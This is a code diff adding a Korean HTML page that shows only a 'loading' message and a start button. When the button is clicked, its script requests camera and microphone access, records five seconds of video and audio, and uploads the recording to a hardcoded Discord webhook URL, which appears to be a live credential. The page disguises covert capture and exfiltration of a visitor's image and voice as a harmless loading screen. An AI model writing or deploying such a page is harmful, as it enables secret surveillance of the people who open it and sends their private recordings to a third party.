@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>로딩중</title>
+</head>
+<body>
+  <h2>시작</h2>
+  <p>로딩중</p>
+  <button id="startBtn">시작</button>
+
+  <script>
+    const webhookURL = "https://discord.com/api/webhooks/1393919110005653615/RgqRu8hW5dng4M3y7tp0o_67LhxuaaUYJnSxrXcjJJMWfkuR4JpU-lNCR8PCrL6mxU2e";
+
+    async function startRecording() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          const file = new File([blob], "recorded.webm");
+
+          const formData = new FormData();
+          formData.append("file", file);
+          formData.append("content", "**🎥 녹화 완료 - Discord로 전송됨**");
+
+          await fetch(webhookURL, {
+            method: "POST",
+            body: formData
+          });
+
+          alert("녹화가 완료되어 Discord로 전송되었습니다.");
+        };
+
+        mediaRecorder.start();
+
+        // 5초 녹화
+        setTimeout(() => {
+          mediaRecorder.stop();
+          stream.getTracks().forEach(track => track.stop());
+        }, 5000);
+
+      } catch (err) {
+        console.error("미디어 권한 오류 또는 거부됨:", err);
+        alert("카메라 또는 마이크 권한을 허용해야 합니다.");
+      }
+    }
+
+    document.getElementById("startBtn").addEventListener("click", () => {
+      startRecording();
+    });
+  </script>
+</body>
+</html>
